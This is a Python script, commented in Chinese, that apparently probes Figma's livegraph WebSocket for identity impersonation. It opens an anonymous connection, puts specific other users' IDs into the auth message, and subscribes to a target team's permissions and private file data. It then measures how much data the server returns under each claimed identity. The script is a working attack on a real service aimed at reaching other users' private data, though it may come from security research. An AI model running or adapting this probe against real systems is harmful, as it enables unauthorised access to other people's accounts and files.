"""Figma livegraph WS 身份冒充创造测试

创造目标：让 livegraph 认为我是目标用户（公开文件所有者/团队用户），
从而返回该用户视角的私有数据。

构造：匿名连接（无 cookie）+ auth 消息 args.userId 填目标用户 ID。
之前只测过 userId=null（匿名）和 userId=自己（登录态），从未填过别人 ID。
若服务端信任 auth 消息声明的身份而非 cookie → 身份冒充。

对照组设计（判断标准：服务端 authSuccess 回显身份 + 视图数据量）：
  1. 基准：userId=null（匿名，已知数据被裁剪）
  2. 冒充A：userId=1484993095538571712（公开文件 FileRole 用户）
  3. 冒充B：userId=1488654565930531375（团队 User handle 计算用户）

全部参数来自确定性来源（ws_url_anon.txt / anon_capture2.json）。
"""
import json, sys, time, urllib.parse
import websocket

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

WS_URL_ANON = open(r"D:\scan\_figma_hunt\ws_url_anon.txt").read().strip()
TARGET_TEAM = "1484993099407069875"          # 目标团队（公开文件所属）
PRIVATE_FILE = "qzDqStIDJyGbthpKiuvfwg"       # 私有文件（自己账号创建）
HASH_PERMS = "f25ed3eceb859f73d4484895786b72fcf082f473c83967f96136f7fa8d0f05b4"      # CurrentTeamCombinedPermissions
HASH_OPEN_EDITOR = "3d578d4859a5845c2f037014898cd2e84f17ac3961ec9fa4b7f1d06c302e63c1"  # OpenEditorFileData
COMMIT = "5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"


def auth_msg(user_id):
    return {
        "messageType": "auth", "clientType": "web",
        "args": {"userId": user_id, "anonymousUserId": None},
        "tags": {"clientType": "web", "commitHash": COMMIT,
                 "clientUrl": "https://www.figma.com/file/bv2nMIdFf4u3dESGail4sm"},
        "clientRequestedVersion": 2,
    }


def subscribe(view_name, view_hash, args):
    return {"messageType": "subscribe", "viewName": view_name,
            "viewHash": view_hash, "loadType": "initial", "args": args}


def run_case(name, user_id, wait=10):
    print(f"\n===== 冒充测试: {name} (auth userId={user_id}) =====")
    ws = websocket.create_connection(WS_URL_ANON, timeout=20,
                                     origin="https://www.figma.com",
                                     header=["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"])
    ws.send(json.dumps(auth_msg(user_id)))
    time.sleep(2)
    subs = [
        ("CurrentTeamCombinedPermissions", HASH_PERMS, {"teamId": TARGET_TEAM}),
        ("OpenEditorFileData", HASH_OPEN_EDITOR, {"fileKey": PRIVATE_FILE}),
    ]
    for vn, vh, args in subs:
        ws.send(json.dumps(subscribe(vn, vh, args)))
        print("SENT:", vn, json.dumps(args, ensure_ascii=False))

    auth_echo = None
    stats = {}
    end = time.time() + wait
    while time.time() < end:
        try:
            ws.settimeout(min(3, end - time.time()))
            opcode, data = ws.recv_data()
            if opcode != 0x1:
                continue
            msg = json.loads(data)
            mt = msg.get("messageType")
            if mt == "authSuccess":
                auth_echo = msg
                print("  >>> authSuccess:", json.dumps(msg, ensure_ascii=False)[:300])
            elif mt in ("denormalizedPendingMutations", "viewLoaded"):
                vn = msg.get("viewName") or (msg.get("mutations") and list(msg["mutations"].keys())[0] if isinstance(msg.get("mutations"), dict) else None)
                text = json.dumps(msg, ensure_ascii=False)
                stats[vn] = stats.get(vn, 0) + len(text)
        except websocket.WebSocketTimeoutException:
            continue
        except Exception as e:
            print("  recv err:", e)
            break
    ws.close()
    print("  --- 数据量统计（字节） ---")
    for k, v in sorted(stats.items()):
        print(f"    {k}: {v}")
    return auth_echo, stats


if __name__ == "__main__":
    cases = [
        ("匿名基准 userId=null", None),
        ("冒充A 文件角色用户", "1484993095538571712"),
        ("冒充B 团队用户", "1488654565930531375"),
    ]
    for name, uid in cases:
        try:
            run_case(name, uid)
        except Exception as e:
            print(f"  FAIL: {e}")
